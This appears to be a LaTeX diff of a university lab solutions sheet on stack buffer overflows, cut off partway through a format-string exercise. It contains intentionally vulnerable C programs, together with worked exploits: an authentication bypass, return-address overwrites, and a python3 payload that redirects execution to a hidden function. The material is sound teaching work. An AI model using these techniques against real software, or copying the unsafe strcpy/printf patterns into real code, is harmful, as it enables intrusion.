@@ -1,0 +1,946 @@
+\documentclass[a4paper,11pt]{article}
+
+\usepackage{fullpage}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{amsmath,amsthm}
+\usepackage{amsfonts}
+\usepackage{graphicx}
+\usepackage{latexsym}
+\usepackage{float}
+\usepackage{comment}
+\usepackage{array}
+\usepackage{booktabs}
+
+% --- Packages added for pedagogical enrichment ---
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{hyperref}
+
+%%%%%%%%%%%%%%% LISTINGS CONFIGURATION %%%%%%%%%%%%%%%%%%%
+
+\definecolor{codegreen}{rgb}{0.25,0.49,0.25}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{codered}{rgb}{0.7,0.1,0.1}
+\definecolor{codeblue}{rgb}{0.0,0.0,0.7}
+\definecolor{backcolour}{rgb}{0.97,0.97,0.97}
+
+\lstset{
+    language=C,
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen}\itshape,
+    keywordstyle=\color{codeblue}\bfseries,
+    stringstyle=\color{codered},
+    basicstyle=\ttfamily\small,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=8pt,
+    numberstyle=\tiny\color{codegray},
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=4,
+    frame=single,
+    rulecolor=\color{codegray},
+    xleftmargin=1.5em,
+    framexleftmargin=1.5em,
+    literate={é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1 {î}{{\^i}}1 {ô}{{\^o}}1
+}
+
+%%%%%%%%%%%%%%% TCOLORBOX ENVIRONMENTS %%%%%%%%%%%%%%%%%%
+
+% Course reminder (light blue background)
+\newtcolorbox{rappel}[1][]{
+    colback=blue!5!white,
+    colframe=blue!50!black,
+    fonttitle=\bfseries,
+    title={\large Course Reminder},
+    #1
+}
+
+% Key takeaway (light green background)
+\newtcolorbox{pointcle}[1][]{
+    colback=green!5!white,
+    colframe=green!40!black,
+    fonttitle=\bfseries,
+    title={Key Takeaway},
+    #1
+}
+
+% Warning (light orange background)
+\newtcolorbox{attention}[1][]{
+    colback=orange!8!white,
+    colframe=orange!60!black,
+    fonttitle=\bfseries,
+    title={Warning},
+    #1
+}
+
+% Ethical disclaimer (red background)
+\newtcolorbox{ethique}[1][]{
+    colback=red!5!white,
+    colframe=red!60!black,
+    fonttitle=\bfseries\large,
+    title={Ethical and Legal Disclaimer},
+    #1
+}
+
+%%%%%%%%%%%%%%% COMMANDS %%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\itemb}{\item[$\bullet$]}
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\Znat}{\mathbb{Z}}
+\newcommand{\Nnat}{\mathbb{N}}
+
+%%%%%%%%%%%%%%% ENVIRONMENTS %%%%%%%%%%%%%%%%%%%%%%%
+
+\theoremstyle{plain}
+\newtheorem{lemme}{Lemma}
+\newtheorem{algorithme}{Algorithm}
+\newtheorem{corolaire}{Corollary}
+\newtheorem{propriete}{Property}
+\newtheorem{proposition}{Proposition}
+\newtheorem{theoreme}{Theorem}
+\newtheorem{definition}{Definition}
+\newtheorem{correction}{Answer}
+
+\theoremstyle{definition}
+\newtheorem{exercice}{Exercise}
+\newtheorem{remarque}{Remark}
+\newtheorem{exemple}{Example}
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue!60!black,
+    urlcolor=blue!60!black
+}
+
+%%%%%%%%%%%%%% DOCUMENT %%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\begin{document}
+
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
+\noindent \textbf{University of Perpignan} \hfill  L3 Computer Science \\
+ \hfill C. Legrand \hfill  Year \the\year \\
+\smallskip
+\begin{center}
+{
+  {\scshape \large Lab Work 5 -- Security -- Solutions}  \\
+ Intrusion Techniques -- Buffer Overflow
+}
+\end{center}
+\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
+
+\bigskip
+
+% --- Ethical disclaimer ---
+\begin{ethique}
+The techniques presented in this lab work are studied within a \textbf{strictly academic context} in order to understand the mechanisms used by attackers and thus be better able to defend against them.
+
+\textbf{Any use of these techniques outside the educational context is illegal} and punishable by criminal penalties (Chapter III of the French Penal Code, Articles 323-1 to 323-8 -- \textit{Offences against Automated Data Processing Systems}):
+\begin{itemize}
+    \item Unauthorized access to or remaining in an ADPS (Art.~323-1): \textbf{3 years} imprisonment and \textbf{\texteuro{}100,000} fine
+    \item Obstructing the operation of an ADPS (Art.~323-2): \textbf{5 years} imprisonment and \textbf{\texteuro{}150,000} fine
+    \item Fraudulent introduction of data into an ADPS (Art.~323-3): \textbf{5 years} imprisonment and \textbf{\texteuro{}150,000} fine
+\end{itemize}
+Penalties increased to \textbf{7 years} and \textbf{\texteuro{}300,000} when the targeted system processes personal data operated by the State, and up to \textbf{10 years} and \textbf{\texteuro{}300,000} for organized crime (Art.~323-4-1). \textit{Penalties updated by the LOPMI law no.~2023-22 of January 24, 2023.}
+\end{ethique}
+
+\bigskip
+
+\begin{tcolorbox}[colback=gray!5!white, colframe=gray!60!black, title={Compilation Options}]
+The following options should be used when you want to overflow the stack (\texttt{-fno-stack-protector}) and know the code addresses (\texttt{-no-pie}) which are no longer randomized:
+\begin{lstlisting}[language=bash,numbers=none]
+gcc -fno-stack-protector -no-pie -g code.c
+\end{lstlisting}
+One last option that we will not use here: if you wish to execute code injected onto the stack (\texttt{-z execstack}).
+\end{tcolorbox}
+
+\medskip
+
+\begin{rappel}
+\textbf{Stack organization:} when calling a function, the processor pushes:
+\begin{enumerate}
+    \item The function parameters (partly via registers on x86-64)
+    \item The return address \texttt{savedRIP} (pushed by \texttt{call})
+    \item The old \texttt{RBP} (\texttt{savedRBP}) saved by \texttt{push rbp}
+    \item The function's local variables
+\end{enumerate}
+The \texttt{RSP} register points to the top of the stack; \texttt{RBP} points to the base of the current stack frame.
+
+\medskip
+\textbf{Stack layout (high to low addresses):}
+\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white}]
+High addresses
++---------------------------+
+| Function parameters       |  (partly in registers on x86-64)
++---------------------------+
+| savedRIP (return address) |  <-- rbp + 8
++---------------------------+
+| savedRBP (old rbp)        |  <-- rbp
++---------------------------+
+| Local variable 1          |  <-- rbp - 8
++---------------------------+
+| Local variable 2          |  <-- rbp - 16
++---------------------------+
+| ...                       |
++---------------------------+
+Low addresses (RSP points here)
+\end{lstlisting}
+\end{rappel}
+
+\bigskip
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 1: Buffer Overflow
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Buffer Overflow]
+\begin{enumerate}
+\item
+Consider the following program:
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]){
+  int valeur=5;
+  char tampon_un[8], tampon_deux[8];
+
+  strcpy(tampon_un,"un");
+  strcpy(tampon_deux,"deux");
+
+  printf("[AVANT] tampon_deux est a %p et contient '%s'\n",
+         tampon_deux, tampon_deux);
+  printf("[AVANT] tampon_un est a %p et contient '%s'\n",
+         tampon_un, tampon_un);
+  printf("[AVANT] valeur est a %p et vaut %d (0x%08x)\n",
+         &valeur, valeur, valeur);
+
+  printf("\n [STRCPY] copie de %d octets dans tampon_deux\n\n",
+         (int)strlen(argv[1]));
+  strcpy(tampon_deux, argv[1]);
+
+  printf("[APRES] tampon_deux est a %p et contient '%s'\n",
+         tampon_deux, tampon_deux);
+  printf("[APRES] tampon_un est a %p et contient '%s'\n",
+         tampon_un, tampon_un);
+  printf("[APRES] valeur est a %p et vaut %d (0x%08x)\n",
+         &valeur, valeur, valeur);
+
+  return(0);
+}
+\end{lstlisting}
+
+By varying the argument, trigger a buffer overflow and analyze it with \texttt{gdb}.
+
+\begin{pointcle}
+The \texttt{strcpy} function does \textbf{NOT} check the destination buffer size. If the source is longer than the buffer, surplus bytes overwrite adjacent data on the stack.
+\end{pointcle}
+
+\item Consider the following code fragment that restricts access rights:
+
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int verif_authentication(char *password){
+  int auth_flag = 0;
+  char password_tampon[16];
+
+  strcpy(password_tampon, password);
+
+  if( strcmp(password_tampon, "brillig") == 0)
+    auth_flag = 1;
+  if(strcmp(password_tampon, "outgrabe") == 0)
+    auth_flag = 1;
+
+  return auth_flag;
+}
+
+int main( int argc, char *argv[]){
+  if(argc < 2){
+    printf("Usage: %s <password>\n", argv[0]);
+    exit(0);
+  }
+
+  if(verif_authentication(argv[1])){
+    printf("\n-=-=-=-=-=-=-=-=-=-=--=-=-\n");
+    printf("      Acces accorde.\n");
+    printf("-=-=-=-=-=-=-=-=-=-=--=-=-\n");
+  }
+  else
+    printf("     Acces refuse\n");
+}
+\end{lstlisting}
+Is it possible to perform a buffer overflow to force access (\texttt{auth\_flag} $\neq 0$)? What happens if the variables are declared in the following order:
+\begin{lstlisting}[language=C,numbers=none]
+  char password_tampon[16];
+  int auth_flag = 0;
+\end{lstlisting}
+Can you still work around this issue to display \texttt{Acces accorde} via buffer overflow? Explain in detail why it works.
+\end{enumerate}
+\end{exercice}
+
+\begin{correction}
+
+\begin{enumerate}
+\item \textbf{Overflow analysis with gdb:}
+
+\medskip
+\textbf{Step 1: Compile with protections disabled.}
+\begin{lstlisting}[language=bash,numbers=none]
+$ gcc -fno-stack-protector -no-pie -g code-exo1-q1-debordement-simple.c
+\end{lstlisting}
+
+\textbf{Step 2: Run with a short argument (no overflow).}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out AAAA
+[AVANT] tampon_deux est a 0x7fffffffde10 et contient 'deux'
+[AVANT] tampon_un est a 0x7fffffffde18 et contient 'un'
+[AVANT] valeur est a 0x7fffffffde24 et vaut 5 (0x00000005)
+
+ [STRCPY] copie de 4 octets dans tampon_deux
+
+[APRES] tampon_deux est a 0x7fffffffde10 et contient 'AAAA'
+[APRES] tampon_un est a 0x7fffffffde18 et contient 'un'
+[APRES] valeur est a 0x7fffffffde24 et vaut 5 (0x00000005)
+\end{lstlisting}
+
+Everything is normal: \texttt{tampon\_deux} is at a lower address than \texttt{tampon\_un}, which is lower than \texttt{valeur}. The arrays are adjacent on the stack.
+
+\medskip
+\textbf{Step 3: Run with 8 bytes (exact overflow into tampon\_un).}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out AAAAAAAABBBB
+[APRES] tampon_deux est a 0x7fffffffde10 et contient 'AAAAAAAABBBB'
+[APRES] tampon_un est a 0x7fffffffde18 et contient 'BBBB'
+[APRES] valeur est a 0x7fffffffde24 et vaut 5 (0x00000005)
+\end{lstlisting}
+
+The 8 'A' bytes fill \texttt{tampon\_deux} (8 bytes), then the 'B' bytes overflow into \texttt{tampon\_un}. Notice that \texttt{tampon\_un} now contains \texttt{"BBBB"} instead of \texttt{"un"}.
+
+\medskip
+\textbf{Step 4: Run with enough bytes to reach valeur.}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out AAAAAAAABBBBBBBBCCCCCCCC
+[APRES] tampon_deux est a 0x7fffffffde10 et contient 'AAAAAAAABBBBBBBBCCCCCCCC'
+[APRES] tampon_un est a 0x7fffffffde18 et contient 'BBBBBBBBCCCCCCCC'
+[APRES] valeur est a 0x7fffffffde24 et vaut 1128481603 (0x43434343)
+\end{lstlisting}
+
+The variable \texttt{valeur} now contains \texttt{0x43434343} (the ASCII code for 'C' is \texttt{0x43}). The overflow has \textbf{overwritten the integer variable} with our chosen bytes.
+
+\medskip
+\textbf{GDB analysis:}
+\begin{lstlisting}[language=bash,numbers=none]
+$ gdb ./a.out
+(gdb) break main
+(gdb) run AAAAAAAABBBBBBBBCCCC
+(gdb) info locals
+valeur = 5
+(gdb) x/40bx tampon_deux
+\end{lstlisting}
+
+In GDB, \texttt{x/40bx} displays 40 bytes starting from \texttt{tampon\_deux}. You can observe the adjacent memory layout: \texttt{tampon\_deux} (8 bytes) $\rightarrow$ \texttt{tampon\_un} (8 bytes) $\rightarrow$ padding $\rightarrow$ \texttt{valeur} (4 bytes).
+
+\medskip
+\textbf{Explanation:} The variables are stored adjacently on the stack in decreasing address order. Since \texttt{strcpy} does not check bounds, writing beyond \texttt{tampon\_deux}'s 8 bytes continues into the memory occupied by \texttt{tampon\_un} and then \texttt{valeur}.
+
+\begin{attention}
+The exact memory layout depends on the compiler and optimization level. Always use \texttt{gdb} to verify the actual addresses and offsets on your system. The compiler may add padding between variables for alignment purposes.
+\end{attention}
+
+\item \textbf{Authentication bypass:}
+
+\medskip
+\textbf{Case 1: \texttt{auth\_flag} declared BEFORE \texttt{password\_tampon} (original code).}
+
+In the original code:
+\begin{lstlisting}[language=C,numbers=none]
+  int auth_flag = 0;
+  char password_tampon[16];
+\end{lstlisting}
+
+On the stack, \texttt{password\_tampon} is at a \textbf{lower} address than \texttt{auth\_flag} (the stack grows downward, so variables declared later are at lower addresses). When we overflow \texttt{password\_tampon}, we write toward \textbf{higher} addresses, i.e., toward \texttt{auth\_flag}.
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out AAAAAAAAAAAAAAAAAAAAAAAAA
+-=-=-=-=-=-=-=-=-=-=--=-=-
+      Acces accorde.
+-=-=-=-=-=-=-=-=-=-=--=-=-
+\end{lstlisting}
+
+By providing more than 16 characters, the overflow of \texttt{password\_tampon} overwrites \texttt{auth\_flag} with non-zero bytes (the 'A' characters). Since any non-zero value of \texttt{auth\_flag} is interpreted as true, access is granted.
+
+\medskip
+\textbf{Stack layout (Case 1):}
+\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white}]
+High addresses
++---------------------------+
+| savedRIP                  |  <-- rbp + 8
++---------------------------+
+| savedRBP                  |  <-- rbp
++---------------------------+
+| auth_flag (4 bytes)       |  <-- rbp - 4   (overwritten!)
++---------------------------+
+| padding (alignment)       |
++---------------------------+
+| password_tampon[16]       |  <-- rbp - 0x20 (overflow starts here)
++---------------------------+
+Low addresses
+\end{lstlisting}
+
+\medskip
+\textbf{Case 2: \texttt{password\_tampon} declared BEFORE \texttt{auth\_flag} (reversed order).}
+
+\begin{lstlisting}[language=C,numbers=none]
+  char password_tampon[16];
+  int auth_flag = 0;
+\end{lstlisting}
+
+Now \texttt{auth\_flag} is at a \textbf{lower} address than \texttt{password\_tampon}. Overflowing \texttt{password\_tampon} writes toward higher addresses, away from \texttt{auth\_flag}. We \textbf{cannot} directly overwrite \texttt{auth\_flag} this way.
+
+\medskip
+\textbf{However, we can still bypass the authentication!} The overflow continues past \texttt{auth\_flag}'s location and reaches \texttt{savedRBP} and then \texttt{savedRIP} (the return address). By carefully crafting the input, we can overwrite \texttt{savedRIP} to redirect execution to the code that prints \texttt{"Acces accorde"}, skipping the conditional check entirely.
+
+\begin{lstlisting}[language=bash,numbers=none]
+# Find the address of the "Acces accorde" printf block using gdb:
+$ gdb ./a.out
+(gdb) disas main
+# Identify the address of the instruction after the conditional jump
+# that leads to the "Acces accorde" printf calls.
+# Then craft the payload to overwrite savedRIP with that address.
+\end{lstlisting}
+
+\textbf{Why it works:} Even when we cannot directly overwrite the target variable, we can always overwrite \texttt{savedRIP} (the return address) which is always at a higher address than local variables. This allows us to redirect execution anywhere in the program.
+
+\end{enumerate}
+
+\begin{pointcle}
+The \texttt{strcpy} function does \textbf{NOT} check the destination buffer size. If the source is longer, surplus bytes overwrite adjacent data on the stack. Even if the variable layout prevents direct overwrite of a target variable, the attacker can always reach \texttt{savedRIP} to redirect the execution flow.
+\end{pointcle}
+
+\end{correction}
+
+\bigskip
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 2: Return Address Modification (Increment)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Modifying the Return Address on the Stack]
+Using the code from the lecture (given below), adjust the values of $a$ and $b$ in order to execute, upon function return:
+\begin{itemize}
+\item Directly the end of the \texttt{main} function (thus skipping both \texttt{printf("coucou1")} and \texttt{printf("coucou2")}).
+  \item What will happen if we return to the instruction \texttt{b=15}?
+\end{itemize}
+
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+
+void function(long a, long b)
+{
+  long buffer[2]={0,1};
+  buffer[a]+=b;
+}
+void main()
+{
+  long a,b;
+  a=1;
+  b=15;
+  function(a,b);
+  printf("coucou1\n");
+  printf("coucou2\n");
+}
+\end{lstlisting}
+
+\begin{rappel}
+To find the correct values of \texttt{a} and \texttt{b}, you must:
+\begin{enumerate}
+    \item Analyze the assembly code with \texttt{gdb} to determine the size of \texttt{function}'s stack frame
+    \item Calculate the offset between \texttt{buffer[0]} and \texttt{savedRIP}
+    \item Determine the increment needed to jump past the desired instructions
+\end{enumerate}
+\end{rappel}
+\end{exercice}
+
+\begin{correction}
+
+\textbf{Step 1: Analyze the stack frame of \texttt{function} with gdb.}
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ gcc -fno-stack-protector -no-pie -g code-exo2-modif-adresse-retour.c
+$ gdb ./a.out
+(gdb) disas function
+\end{lstlisting}
+
+Typical disassembly of \texttt{function}:
+\begin{lstlisting}[language=bash,numbers=none]
+Dump of assembler code for function:
+   push   rbp
+   mov    rbp,rsp
+   mov    QWORD PTR [rbp-0x28],rdi       # parameter a
+   mov    QWORD PTR [rbp-0x30],rsi       # parameter b
+   mov    QWORD PTR [rbp-0x10],0x0       # buffer[0] = 0
+   mov    QWORD PTR [rbp-0x8],0x1        # buffer[1] = 1
+   ...
+   buffer[a] += b
+   ...
+   leave
+   ret
+\end{lstlisting}
+
+From the disassembly, we can determine:
+\begin{itemize}
+\item \texttt{buffer[0]} is at \texttt{rbp - 0x10} (i.e., \texttt{rbp - 16})
+\item \texttt{buffer[1]} is at \texttt{rbp - 0x8} (i.e., \texttt{rbp - 8})
+\item \texttt{savedRBP} is at \texttt{rbp + 0} (8 bytes)
+\item \texttt{savedRIP} is at \texttt{rbp + 0x8} (i.e., \texttt{rbp + 8})
+\end{itemize}
+
+\medskip
+\textbf{Step 2: Calculate the value of \texttt{a}.}
+
+Each element of \texttt{buffer} is a \texttt{long} (8 bytes on x86-64). The instruction \texttt{buffer[a] += b} accesses address \texttt{buffer + a * 8}.
+
+We need: \texttt{buffer + a * 8 = savedRIP}
+
+\begin{itemize}
+\item \texttt{buffer[0]} is at \texttt{rbp - 16}
+\item \texttt{savedRIP} is at \texttt{rbp + 8}
+\item Offset = (\texttt{rbp + 8}) - (\texttt{rbp - 16}) = 24 bytes = 3 longs
+\end{itemize}
+
+Therefore: $\boxed{a = 3}$
+
+\medskip
+\textbf{Step 3: Calculate the value of \texttt{b} (skip both printf calls).}
+
+\begin{lstlisting}[language=bash,numbers=none]
+(gdb) disas main
+Dump of assembler code for main:
+   ...
+   call   function                    # address X
+   lea    rdi,[rip+...]   # "coucou1\n"   <-- savedRIP points here (X+5)
+   call   printf
+   lea    rdi,[rip+...]   # "coucou2\n"
+   call   printf
+   nop                                # <-- we want to jump here
+   leave
+   ret
+\end{lstlisting}
+
+The value of \texttt{b} is the number of bytes to add to \texttt{savedRIP} to skip past both \texttt{printf} calls. This depends on the exact encoding of the instructions.
+
+Typically, each \texttt{lea + call printf} block takes about 12--15 bytes. You need to read the exact addresses from the disassembly:
+
+\begin{lstlisting}[language=bash,numbers=none]
+(gdb) disas main
+   0x00000000004011a0 <+35>:  call   0x401156 <function>
+   0x00000000004011a5 <+40>:  lea    rdi,[rip+0xe5c]   # "coucou1"
+   0x00000000004011ac <+47>:  call   0x401030 <puts@plt>
+   0x00000000004011b1 <+52>:  lea    rdi,[rip+0xe52]   # "coucou2"
+   0x00000000004011b8 <+59>:  call   0x401030 <puts@plt>
+   0x00000000004011bd <+64>:  nop
+   0x00000000004011be <+65>:  leave
+   0x00000000004011bf <+66>:  ret
+\end{lstlisting}
+
+In this example:
+\begin{itemize}
+\item \texttt{savedRIP} = \texttt{0x4011a5} (instruction after \texttt{call function})
+\item Target (skip both printf) = \texttt{0x4011bd} (the \texttt{nop} before \texttt{leave})
+\item $b$ = \texttt{0x4011bd} - \texttt{0x4011a5} = \texttt{0x18} = 24
+\end{itemize}
+
+\begin{attention}
+The exact value of $b$ depends on your specific compilation. You \textbf{must} use \texttt{gdb} to read the actual addresses. The compiler may generate \texttt{puts} instead of \texttt{printf} when the format string has no format specifiers (just a string ending with \texttt{\textbackslash n}).
+\end{attention}
+
+\medskip
+\textbf{Final code:}
+\begin{lstlisting}[language=C]
+void main()
+{
+  long a,b;
+  a=3;     // offset to reach savedRIP (3 longs = 24 bytes)
+  b=24;    // increment to skip both printf calls (adjust per your disas)
+  function(a,b);
+  printf("coucou1\n");  // skipped!
+  printf("coucou2\n");  // skipped!
+}
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out
+$                     # No output: both printf calls were skipped
+\end{lstlisting}
+
+\medskip
+\textbf{Step 4: What happens if we return to \texttt{b=15}?}
+
+If the value of $b$ is calculated so that \texttt{savedRIP} points to the instruction \texttt{b=15} in \texttt{main} (which is \textbf{before} the \texttt{call function} instruction), then upon return from \texttt{function}:
+\begin{enumerate}
+\item Execution jumps to \texttt{b=15}
+\item Then \texttt{function(a,b)} is called again
+\item Inside \texttt{function}, \texttt{buffer[a] += b} modifies \texttt{savedRIP} again
+\item Upon return, execution jumps back to \texttt{b=15}
+\item This repeats indefinitely
+\end{enumerate}
+
+This creates an \textbf{infinite loop}. The program never terminates and keeps calling \texttt{function} over and over again. Eventually, the stack may overflow due to repeated calls (if the compiler does not optimize the frame reuse), or the program just loops forever.
+
+\begin{rappel}
+\textbf{GDB analysis methodology for return address attacks:}
+\begin{enumerate}
+    \item Compile with \texttt{-fno-stack-protector -no-pie -g}
+    \item Use \texttt{disas function} to find \texttt{buffer}'s position relative to \texttt{rbp}
+    \item Use \texttt{disas main} to find the exact addresses of instructions to skip
+    \item Calculate $a$ = (distance from \texttt{buffer[0]} to \texttt{savedRIP}) / \texttt{sizeof(long)}
+    \item Calculate $b$ = (target address) - (normal return address)
+    \item Set breakpoints and use \texttt{x/xg \$rbp+8} to verify \texttt{savedRIP}
+    \item Use \texttt{stepi} to single-step through instructions and confirm the redirect
+\end{enumerate}
+\end{rappel}
+
+\end{correction}
+
+\bigskip
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 3: Return Address Overwrite via Overflow
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Return Address Overwrite via Overflow]
+Consider the following code:
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void f(char *s)
+{
+  char nom[10];
+  strcpy(nom,s);
+  printf("\n");
+  printf("%lx\n",*((unsigned long *)(nom+18)));
+  printf("Bonjour %s, on est dans f\n",nom);
+}
+
+void secret()
+{
+  printf("on est dans secret\n");
+}
+
+int main(int argc, char **argv)
+{
+  printf("adresse de f=%p, et de secret=%p\n",f,secret);
+  f(argv[1]);
+}
+\end{lstlisting}
+By overwriting the return address of the call to function \texttt{f}, make the program execute function \texttt{secret}.
+
+\begin{attention}
+To pass a string of characters specified by their ASCII code as a parameter, you can use \texttt{python3} as follows (for the two ASCII codes \texttt{0x11} and \texttt{0xff}):
+\begin{lstlisting}[language=bash,numbers=none]
+$ python3 -c "print('\x11\xff')"
+\end{lstlisting}
+\end{attention}
+\end{exercice}
+
+\begin{correction}
+
+\textbf{Step 1: Compile and find the addresses.}
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ gcc -fno-stack-protector -no-pie -g code-exo3-ecrasement-adresse-retour.c
+$ ./a.out test
+adresse de f=0x401156, et de secret=0x4011a0
+
+Bonjour test, on est dans f
+\end{lstlisting}
+
+The program helpfully prints the addresses of both functions. We need to redirect execution to \texttt{secret} at address \texttt{0x4011a0} (this address varies per compilation; use the one your program prints).
+
+\medskip
+\textbf{Step 2: Analyze the stack frame of \texttt{f} with gdb.}
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ gdb ./a.out
+(gdb) disas f
+Dump of assembler code for function f:
+   push   rbp
+   mov    rbp,rsp
+   sub    rsp,0x20
+   mov    QWORD PTR [rbp-0x18],rdi    # parameter s
+   lea    rax,[rbp-0xa]               # nom starts at rbp-0xa
+   ...
+\end{lstlisting}
+
+From the disassembly:
+\begin{itemize}
+\item \texttt{nom} starts at \texttt{rbp - 0xa} (i.e., \texttt{rbp - 10})
+\item \texttt{savedRBP} is at \texttt{rbp + 0} (8 bytes)
+\item \texttt{savedRIP} is at \texttt{rbp + 8}
+\end{itemize}
+
+\medskip
+\textbf{Step 3: Calculate the padding.}
+
+Distance from \texttt{nom} to \texttt{savedRIP}:
+\begin{itemize}
+\item From \texttt{rbp - 10} to \texttt{rbp + 8} = 18 bytes
+\end{itemize}
+
+We need:
+\begin{itemize}
+\item 18 bytes of padding (to fill \texttt{nom} + \texttt{savedRBP})
+\item Then the address of \texttt{secret()} in little-endian byte order
+\end{itemize}
+
+\begin{attention}
+Note that the line \texttt{printf("\%lx\textbackslash n", *((unsigned long *)(nom+18)))} in the source code already reads the 8 bytes at offset 18 from \texttt{nom} -- this is precisely \texttt{savedRIP}! This is a hint from the exercise: it confirms that the return address is 18 bytes from the start of \texttt{nom}.
+\end{attention}
+
+\medskip
+\textbf{Step 4: Craft the exploit.}
+
+Assuming \texttt{secret} is at \texttt{0x4011a0} (check your own output!), in little-endian: \texttt{\textbackslash xa0\textbackslash x11\textbackslash x40} followed by null bytes (since the upper bytes of the address are 0x00).
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out $(python3 -c "import sys; sys.stdout.buffer.write(b'a'*18 + b'\xa0\x11\x40\x00\x00\x00\x00\x00')")
+adresse de f=0x401156, et de secret=0x4011a0
+
+4011a0
+Bonjour aaaaaaaaaaaaaaaaaa@, on est dans f
+on est dans secret
+\end{lstlisting}
+
+The program prints \texttt{"on est dans secret"}, confirming that execution was successfully redirected to the \texttt{secret()} function.
+
+\medskip
+\textbf{Explanation:}
+\begin{enumerate}
+\item The 18 'a' characters fill the space from \texttt{nom} up to (but not including) \texttt{savedRIP}
+\item The next bytes (\texttt{\textbackslash xa0\textbackslash x11\textbackslash x40\textbackslash x00...}) overwrite \texttt{savedRIP} with the address of \texttt{secret()}
+\item When \texttt{f()} executes \texttt{ret}, it pops this crafted address into \texttt{RIP}
+\item Execution jumps to \texttt{secret()} instead of returning to \texttt{main()}
+\end{enumerate}
+
+\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white}]
+Stack of f() after overflow:
++---------------------------+
+| savedRIP = 0x4011a0       |  <-- overwritten with secret()'s address!
++---------------------------+
+| savedRBP = 0x616161...    |  <-- overwritten with 'a' bytes
++---------------------------+
+| nom = "aaaaaaaaaa"        |  <-- 10 bytes of 'a'
++---------------------------+
+\end{lstlisting}
+
+\begin{attention}
+\begin{itemize}
+\item The address must be written in \textbf{little-endian} byte order (least significant byte first), because x86-64 is a little-endian architecture.
+\item Using \texttt{python3 -c "print(...)"} may add a trailing newline (\texttt{\textbackslash x0a}). Using \texttt{sys.stdout.buffer.write()} avoids this issue.
+\item After \texttt{secret()} finishes, the program will likely crash (segfault) because the stack frame is corrupted. This is expected in a simple exploit.
+\item If ASLR is enabled (default on modern Linux), addresses are randomized. The \texttt{-no-pie} flag disables position-independent code to make addresses predictable.
+\end{itemize}
+\end{attention}
+
+\end{correction}
+
+\bigskip
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 4: printf Format String Exploit
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Exploiting the \texttt{printf} Format String]
+Consider the following code compiled with the options \texttt{-fno-stack-protector -no-pie}:
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+  unsigned long d;
+  char texte[512];
+
+  static int test_var = 100*256*256+100*256+100;
+  if(argc < 3) {
+    printf("Usage: %s <text to print> <entier>\n", argv[0]);
+    exit(0);
+  }
+  d=atoi(argv[2]);
+
+  strcpy(texte, argv[1]);
+  printf("La bonne facon d'afficher des entrees utilisateurs:\n");
+  printf("%s", texte);
+  printf("\nLa mauvaise facon d'afficher des entrees utilisateurs:\n");
+  printf(texte);
+  printf("\n");
+  // Debug output
+  printf("[*] test_var @ %p = %lu, %04x\n", &test_var, &test_var, test_var);
+  printf("[*] adresse de d=%p, valeur de d=0x%016lx\n", &d, d);
+  printf("[*] adresse de texte=%p\n", texte);
+  exit(0);
+}
+\end{lstlisting}
+
+\begin{enumerate}
+\item Understand and test the program, then apply what was covered in the lecture to display the contents of \texttt{main}'s stack by choosing the program's argument wisely on the command line.
